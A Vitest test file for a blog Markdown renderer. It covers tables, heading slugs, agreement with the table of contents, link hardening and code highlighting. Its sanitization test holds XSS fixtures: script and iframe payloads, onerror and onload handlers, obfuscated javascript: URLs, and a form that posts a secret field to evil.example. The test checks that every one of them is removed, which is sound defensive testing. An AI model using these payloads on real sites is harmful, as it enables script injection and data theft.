import { describe, expect, it } from 'vitest';

import blogData from './blog-data.json';
import { generateBlogHeadingId, renderBlogMarkdown } from './render';
import { tocGenerator } from './toc-generator';
import type { MarkdownProcessorOptions } from '@/types/metadata';

const fence = String.fromCharCode(96).repeat(3);

function renderedDocument(
  markdown: string,
  options: MarkdownProcessorOptions = {}
) {
  const html = renderBlogMarkdown(markdown, options);
  const root = document.createElement('main');
  root.dataset.renderedBlog = '';
  root.innerHTML = html;
  return { html, root };
}

describe('renderBlogMarkdown GFM and safe authored HTML', () => {
  it('renders semantic tables, blockquotes, and the authored details pattern', () => {
    const markdown = `| Name | State |
| --- | --- |
| Alpha | Ready |
| Beta | Pending |

> A quoted **warning**
> stays in one block.

<details open>
<summary><strong>More detail</strong></summary>

The safe authored body still has **Markdown**.

</details>`;
    const { root } = renderedDocument(markdown);

    const scroller = root.querySelector<HTMLElement>(
      '[data-blog-table-scroll]'
    );
    expect(scroller).not.toBeNull();
    expect(scroller).toHaveAttribute('tabindex', '0');
    expect(scroller).toHaveClass('blog-table-scroll');

    const table = scroller!.querySelector('table');
    expect(table).not.toBeNull();
    expect(table).toHaveClass('blog-data-table');
    expect(table!.querySelectorAll('thead th')).toHaveLength(2);
    for (const header of table!.querySelectorAll('thead th')) {
      expect(header).toHaveAttribute('scope', 'col');
    }
    expect(table!.querySelectorAll('tbody tr')).toHaveLength(2);
    expect(table!.textContent).toContain('Alpha');

    const quote = root.querySelector('blockquote');
    expect(quote).not.toBeNull();
    expect(quote!.querySelector('strong')).toHaveTextContent('warning');
    expect(quote).toHaveTextContent('stays in one block');

    const details = root.querySelector('details');
    expect(details).not.toBeNull();
    expect(details).toHaveAttribute('open');
    expect(details!.querySelector('summary strong')).toHaveTextContent(
      'More detail'
    );
    expect(details!.querySelector('p strong')).toHaveTextContent('Markdown');
  });
});

describe('renderBlogMarkdown sanitization', () => {
  it('removes executable raw HTML, dangerous attributes, and unsafe URLs', () => {
    const markdown = `Before

<script>alert('script')</script>
<style>body { display: none }</style>
<iframe srcdoc="<script>alert('frame')</script>">frame</iframe>
<object data="https://evil.example/payload">object</object>
<embed src="https://evil.example/payload">
<form action="https://evil.example/collect"><input name="secret"></form>
<svg onload="alert('svg')"><a href="javascript:alert('svg-link')">x</a></svg>
<img src="/safe.png" onerror="alert('image')" style="position:fixed">
<a id="location" href="jav&#x61;script:alert('raw-link')" onclick="alert('click')">raw link</a>
<h2 id="raw-heading" data-blog-heading-index="forged:0">Forged heading</h2>

[Markdown link](javascript:alert('markdown-link'))

![Markdown image](data:text/html;base64,PHNjcmlwdD4=)`;
    const { html, root } = renderedDocument(markdown);

    expect(
      root.querySelector('script, style, iframe, object, embed, form, svg')
    ).toBeNull();
    expect(html).not.toMatch(/\son[a-z]+\s*=/i);
    expect(html).not.toMatch(/\sstyle\s*=/i);
    expect(html).not.toContain("alert('script')");

    for (const element of root.querySelectorAll<HTMLElement>('[href], [src]')) {
      const url = element.getAttribute('href') || element.getAttribute('src');
      expect(url).not.toMatch(/^\s*(?:javascript|data|vbscript)\s*:/i);
    }

    const markdownLink = Array.from(root.querySelectorAll('a')).find(
      (link) => link.textContent === 'Markdown link'
    );
    const markdownImage = root.querySelector<HTMLImageElement>(
      'img[alt="Markdown image"]'
    );
    expect(markdownLink).toHaveAttribute('href', '#');
    expect(markdownImage).toHaveAttribute('src', '#');

    // Raw author ids go through the sanitizer's DOM-clobber prefix. Only the
    // renderer's strict heading ids are restored without it.
    expect(root.querySelector('[id="location"]')).toBeNull();
    expect(root.querySelector('[id="user-content-location"]')).not.toBeNull();
    expect(root.querySelector('[id="raw-heading"]')).toBeNull();
    expect(
      root.querySelector('[id="user-content-raw-heading"]')
    ).not.toBeNull();
    expect(root.querySelector('[data-blog-heading-index]')).toBeNull();
  });
});

describe('renderBlogMarkdown heading compatibility', () => {
  it('keeps the exact published slug algorithm, repeated ids, and conditional demotion', () => {
    const markdown = `# 🌆 Twin — Already Here!

## Child / API_v2

# 🌆 Twin — Already Here!

###### Deepest`;
    const { root } = renderedDocument(markdown, { demoteHeadings: true });

    expect(generateBlogHeadingId('🌆 Twin — Already Here!')).toBe(
      'twin-already-here'
    );
    expect(generateBlogHeadingId('Child / API_v2')).toBe('child-api_v2');
    expect(root.querySelectorAll('h2#twin-already-here')).toHaveLength(2);
    expect(root.querySelector('h3#child-api_v2')).not.toBeNull();
    expect(root.querySelector('h6#deepest')).not.toBeNull();
    expect(root.querySelector('h1')).toBeNull();
  });

  it('does not demote without a body h1 or treat fenced comments as headings', () => {
    const markdown = [
      '## Real section',
      '',
      `${fence}bash`,
      '# not a heading',
      'echo ok',
      fence,
    ].join('\n');
    const { root } = renderedDocument(markdown, { demoteHeadings: true });

    expect(root.querySelector('h2#real-section')).not.toBeNull();
    expect(root.querySelector('h3#real-section')).toBeNull();
    expect(root.querySelector('[id="not-a-heading"]')).toBeNull();
    expect(root.querySelector('pre code.language-bash')).toHaveTextContent(
      '# not a heading'
    );
  });

  /**
   * ONE TEST PER POST, NOT ONE TEST OVER ALL OF THEM (#728).
   *
   * This was a single `it()` that looped the whole authored corpus — rendering every
   * post through the markdown pipeline and parsing each result with jsdom. It is the
   * heaviest test in the suite, and it sometimes exceeded vitest's 5000 ms per-test
   * default when the full suite runs under coverage.
   *
   * Measured on an idle machine with no coverage attached: **636 ms warm, 2590 ms
   * cold**. Half the budget consumed before any load, and a >4x spread run to run.
   * A test that starts a race that far behind loses it eventually.
   *
   * Splitting per post is the fix rather than a bigger number, because picking a
   * timeout means sizing a value against a load distribution nobody has measured —
   * the mistake #751 made twice with the retention window. Each post now gets its
   * own full budget for ~1/15th of the work, and a failure names the offending post
   * in the TEST TITLE instead of only in an assertion message.
   *
   * WHAT THIS SWEEP CAN AND CANNOT CATCH, found by mutating rather than assuming.
   * It asserts the renderer and the TOC generator AGREE — not that either is right.
   * Both derive ids from the same `generateBlogHeadingId`, so corrupting that
   * function shifts both sides identically and all 15 posts still pass. Only a
   * change that makes the two DISAGREE is visible here (verified: suffixing the id
   * in toc-generator.ts alone fails every post). The shared function's own
   * correctness is pinned by the slug-algorithm tests above, which is where that
   * belongs — worth knowing before trusting this sweep to cover a renderer change.
   */
  const corpus = blogData.posts as Array<{ slug: string; content: string }>;

  it('the authored corpus loaded, so the per-post sweep below is not empty', () => {
    // `it.each([])` REGISTERS NOTHING AND THE FILE STILL PASSES. If blog-data.json
    // ever fails to load or changes shape, the sweep would cover zero posts while
    // reporting green — the vacuous-gate shape this repo keeps paying for (#396,
    // #411). This test cannot be skipped out of existence by a bad import, so it is
    // what makes the sweep's silence audible.
    expect(corpus.length).toBeGreaterThanOrEqual(10);
    expect(
      corpus.every((post) => post.slug && post.content?.length > 0),
      'every post needs a slug and content for the sweep to mean anything'
    ).toBe(true);
  });

  it.each(corpus.map((post) => [post.slug, post] as const))(
    'keeps every live TOC anchor resolvable in %s',
    (_slug, post) => {
      const { root } = renderedDocument(post.content, {
        demoteHeadings: true,
      });
      const renderedIds = new Set(
        Array.from(root.querySelectorAll('h1, h2, h3, h4, h5, h6'))
          .map((heading) => heading.id)
          .filter(Boolean)
      );
      const toc = tocGenerator.flatten(tocGenerator.generate(post.content));

      for (const item of toc) {
        expect(
          renderedIds.has(item.id),
          `${post.slug}: TOC anchor #${item.id} must resolve to a rendered heading`
        ).toBe(true);
      }
    }
  );
});

describe('renderBlogMarkdown links and images', () => {
  it('preserves internal/image URLs and hardens external links', () => {
    const markdown = `[external](https://example.com/path)
[internal](/docs/start)
[fragment](#section)
[protocol relative](//cdn.example.com/file)

![A \"quoted\" image](/blog-images/example.png)`;
    const { root } = renderedDocument(markdown);

    const external = root.querySelector<HTMLAnchorElement>(
      'a[href="https://example.com/path"]'
    );
    expect(external).toHaveAttribute('target', '_blank');
    expect(external).toHaveAttribute('rel', 'noopener noreferrer');

    for (const text of ['internal', 'fragment', 'protocol relative']) {
      const link = Array.from(root.querySelectorAll('a')).find(
        (candidate) => candidate.textContent === text
      );
      expect(link).not.toHaveAttribute('target');
      expect(link).not.toHaveAttribute('rel');
    }

    const image = root.querySelector<HTMLImageElement>(
      'img[src="/blog-images/example.png"]'
    );
    expect(image).toHaveAttribute('alt', 'A "quoted" image');
  });

  it('honours the configured external target without retaining opener rels', () => {
    const { root } = renderedDocument('[external](https://example.com)', {
      externalLinksTarget: '_self',
    });
    const external = root.querySelector('a');

    expect(external).toHaveAttribute('target', '_self');
    expect(external).not.toHaveAttribute('rel');
  });
});

describe('renderBlogMarkdown Prism compatibility', () => {
  it('keeps the exact pre/code shape required by BlogContent copy controls', () => {
    const markdown = [
      `${fence}typescript`,
      'const value: string = "<safe>";',
      fence,
    ].join('\n');
    const { html, root } = renderedDocument(markdown);
    const code = root.querySelector('pre > code.language-typescript');

    expect(code).not.toBeNull();
    expect(code).toHaveTextContent('const value: string = "<safe>";');
    expect(code!.querySelector('.token.keyword')).toHaveTextContent('const');
    expect(code!.querySelector('.token.builtin')).toHaveTextContent('string');
    expect(code!.querySelector('safe')).toBeNull();
    expect(html).toMatch(
      /<pre><code class="language-typescript">[\s\S]*<\/code><\/pre>/
    );
  });

  it('escapes unsupported and unlabelled code while retaining copy-compatible language classes', () => {
    const markdown = [
      `${fence}brainfuck`,
      '<script>alert(1)</script> & value',
      fence,
      '',
      fence,
      'plain <tag>',
      fence,
    ].join('\n');
    const { html, root } = renderedDocument(markdown);
    const unsupported = root.querySelector('code.language-brainfuck');
    const plain = root.querySelector('code.language-text');

    expect(unsupported).toHaveTextContent('<script>alert(1)</script> & value');
    expect(unsupported!.querySelector('script')).toBeNull();
    expect(unsupported!.querySelector('.token')).toBeNull();
    expect(plain).toHaveTextContent('plain <tag>');
    expect(html).not.toContain(
      '<code class="language-brainfuck"><script>alert(1)</script>'
    );
    expect(html).toMatch(
      /<pre><code class="language-brainfuck">[\s\S]*<\/code><\/pre>/
    );
    expect(html).toMatch(
      /<pre><code class="language-text">[\s\S]*<\/code><\/pre>/
    );
  });
});
